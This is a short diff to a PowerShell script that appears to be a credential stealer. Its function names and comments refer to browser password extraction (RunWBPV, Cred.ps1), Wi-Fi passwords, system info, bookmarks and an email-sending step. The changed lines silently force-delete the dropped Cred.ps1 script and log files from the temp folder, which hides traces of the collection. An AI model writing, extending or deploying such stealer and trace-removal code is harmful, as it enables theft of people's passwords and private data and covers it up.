@@ -180,7 +180,7 @@ function RunWBPV {
                 }
         }
 
-        Write-Host "Operation $step / $totalSteps is done."
+        Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
         SetEmailSentFalse
 }
 function Get-fullName {
@@ -503,7 +503,7 @@ function ClearCache {
     Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
     Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
     Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\example-logs.txt" -Force -ErrorAction SilentlyContinue
     # # GetWifiPasswords
     # Remove-Item "$env:TEMP\wifi.txt" -Force -ErrorAction SilentlyContinue
     # # GatherSystemInfo
@@ -512,7 +512,6 @@ function ClearCache {
     # Remove-Item -Path $folderToDelete -Recurse -Force -ErrorAction SilentlyContinue
     # ShowTree
     # Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$env:TEMP\example-logs.txt" -Force -ErrorAction SilentlyContinue
     # # Get Bookmarks
     # Remove-Item "$env:TEMP\chrome_bookmarks.txt" -Force -ErrorAction SilentlyContinue
     # Remove-Item "$env:TEMP\edge_bookmarks.txt" -Force -ErrorAction SilentlyContinue
